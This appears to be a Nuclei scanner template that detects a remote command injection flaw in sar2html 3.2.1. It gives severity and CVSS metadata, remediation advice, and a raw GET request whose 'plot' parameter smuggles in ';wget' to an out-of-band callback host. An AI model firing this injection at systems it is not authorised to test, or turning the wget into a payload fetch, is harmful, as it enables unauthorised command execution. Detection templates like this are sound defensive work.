id: sar2html-rce
info:
  name: sar2html 3.2.1 - Remote Command Injection
  author: gy741
  severity: critical
  description: SAR2HTML 3.2.1 has a remote command injection flaw in its index.php
    script, allowing attackers to execute arbitrary commands on the system.
  reference:
  - https://www.exploit-db.com/exploits/49344
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: sar2html,rce,oast,edb
  metadata:
    impact: The impact of the SAR2HTML remote command injection vulnerability is that
      it allows a remote attacker to execute arbitrary commands on the system, potentially
      leading to a compromise of sensitive data or unauthorized access.
    recommendation: It is recommended to immediately update sar2html to version 3.2.2
      or patch the vulnerability to prevent remote attackers from executing arbitrary
      commands on the system.
requests:
- raw:
  - 'GET /index.php?plot=;wget%20http://{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
